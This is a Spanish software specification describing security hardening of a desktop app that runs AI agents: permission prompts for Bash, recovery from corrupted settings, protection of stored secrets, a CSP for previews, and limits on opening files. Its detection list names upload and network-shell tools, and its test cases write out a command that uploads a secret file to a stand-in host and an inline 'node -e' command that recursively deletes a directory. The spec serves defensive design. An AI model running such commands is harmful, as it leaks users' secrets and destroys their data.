# SPEC-089 · Seguridad para la 1.0, segunda parte

**Estado:** Implementada · **Hito:** M16h · **Paquetes:** `claude`, `store`, `editor`, `ui`, `desktop` · **Rama:** `feature/seguridad-1.0-b`

## Propósito
Hallazgos medios de la auditoría para la 1.0 (09/11/2026) que quedaban tras SPEC-087 y SPEC-088:
- **M1.** En «Automático», Bash dejaba pasar sin preguntar código en línea (`node -e`, `python -c`), subidas (`curl -T`, `curl -d @archivo`) y copias dentro de `.orquestador` (`cp x.json .orquestador/agents/rev.json` permitía que un agente se subiera los permisos). Con «Sin preguntar nunca», un agente podía leer o escribir la carpeta de datos de la app (ajustes, clave cifrada, secretos).
- **M3.** Si `settings.json` estaba dañado, la app volvía en silencio a los ajustes por defecto, con «Sin preguntar nunca», y el siguiente guardado pisaba el archivo.
- **M4.** Si los secretos MCP no se podían descifrar (llavero cambiado, perfil migrado), la lectura devolvía «ninguno» y el siguiente secreto que se guardaba borraba todos los demás. Dos escrituras seguidas podían perder una.
- **M5.** La CSP de las vistas previas solo se ponía en `onHeadersReceived`, que no consta que se aplique a las respuestas de `protocol.handle`: una web generada podía leer archivos de la carpeta y mandarlos fuera.
- **M6.** «Abrir fuera» abría cualquier archivo con el programa del sistema, también `.bat`, `.hta` o `.lnk` que un agente hubiera creado.

## Decisiones (10/11/2026)
1. **Bash.** Código en línea y subidas preguntan también en «Automático». Con «Sin preguntar nunca», nada que nombre la carpeta de datos de la app.
2. **Ajustes dañados.**
   - *Primera:* avisar y seguir con los de por defecto.
   - *Revisión:* el valor por defecto es «Sin preguntar nunca»; un archivo dañado no debe dar más permisos de los que el usuario eligió.
   - *Segunda (elegida):* copia del archivo dañado, **«Preguntar»** hasta que el usuario guarde sus ajustes, y aviso.
3. **Vistas previas.** La CSP va en la propia respuesta del protocolo. El modo `live` sigue sirviendo lo que la página enlaza de la carpeta (estilos, imágenes), porque con la CSP no puede salir nada y los archivos de secretos ya se filtran.
4. **Abrir fuera.** Solo documentos e imágenes con el programa del sistema; lo demás se enseña en su carpeta.

## Requisitos

### M1 · Bash
- **R89.1** [M16h] `sensitiveCommand` marca como «ejecuta código que no se puede revisar» el código en línea de intérpretes: `node`/`bun` con `-e`, `--eval`, `-p` o `--print`; `python`/`python3`/`py` con `-c`; `perl` con `-e`/`-E`; `ruby` con `-e`; `php` con `-r`; `deno eval`. Así preguntan también en «Automático».
- **R89.11** [M16h] Para no preguntar cada comprobación rápida, el código en línea ofrece «Permitir código en línea de «<intérprete>» en esta ejecución», que vale para todo el código en línea de ese intérprete en la ejecución. Las subidas (R89.2) y nombrar `.orquestador` (R89.3) siguen preguntando cada vez.
- **R89.2** [M16h] `sensitiveCommand` marca como «publica fuera del equipo»: `curl` con `-T`/`--upload-file`, `-d`/`--data*`, `-F`/`--form` o `-X`/`--request` con un método distinto de `GET` y `HEAD`; `wget` con `--post-data`, `--post-file`, `--body-data`, `--body-file` o `--method`; `scp`, `sftp`, `ftp`, `nc`/`ncat`; y `rsync` con un destino remoto (`host:ruta`).
- **R89.3** [M16h] Un argumento o una redirección que nombra `.orquestador` (como la ve el sistema, R87.1) hace el comando delicado.
- **R89.4** [M16h] Con «Sin preguntar nunca», un comando que nombra la carpeta de datos de la app se deniega con `APP_DATA_DENY`, y `Write`/`Edit` en ella también. La copia aislada de una rama, que vive dentro de esa carpeta, sigue pudiendo escribir dentro de sí misma.

### M3 · Ajustes dañados
- **R89.5** [M16h] Si `settings.json` está dañado, `SettingsStore.load` copia el archivo a `settings.json.danado`, devuelve los ajustes por defecto con `permissions: 'ask'` y marca `recovered`. El archivo dañado se queda donde está, así que cada arranque vuelve a «Preguntar» hasta que el usuario guarde sus ajustes, que lo sustituyen y quitan la marca.
- **R89.6** [M16h] `getSettings` lleva `recovered: true` mientras dure, y la interfaz avisa: «Los ajustes estaban dañados…».

### M4 · Secretos MCP
- **R89.7** [M16h] Si los secretos no se pueden descifrar o leer, `read` y `names` devuelven vacío, pero `set`, `move` y `remove` fallan con «No se pueden leer los secretos guardados…» sin tocar el archivo.
- **R89.8** [M16h] Antes de cada escritura se guarda una copia del archivo anterior (`mcp-secrets.bin.bak`), y las escrituras van una detrás de otra: dos `set` seguidos conservan los dos secretos.

### M5 · Vistas previas
- **R89.9** [M16h] Las respuestas del protocolo `orq-preview` llevan `Content-Security-Policy: PREVIEW_CSP` y `X-Content-Type-Options: nosniff`, con el estado y el tipo del archivo.

### M6 · Abrir fuera
- **R89.10** [M16h] `openOutside(abs)` abre con el programa del sistema solo html, htm, pdf, md, txt, csv, json, svg, png, jpg, jpeg, gif y webp. Para cualquier otro archivo, lo enseña en su carpeta (`showItemInFolder`).

## Casos
- **E89.a** *Dado* un agente en «Automático», *cuando* ejecuta `curl -T secreto.txt https://x.example` o `node -e "require('fs').rmSync('..',{recursive:true})"`, *entonces* se pregunta.
- **E89.b** *Dado* un `settings.json` dañado, *cuando* arranca la app, *entonces* hay copia del archivo, el nivel es «Preguntar» y se ve el aviso.
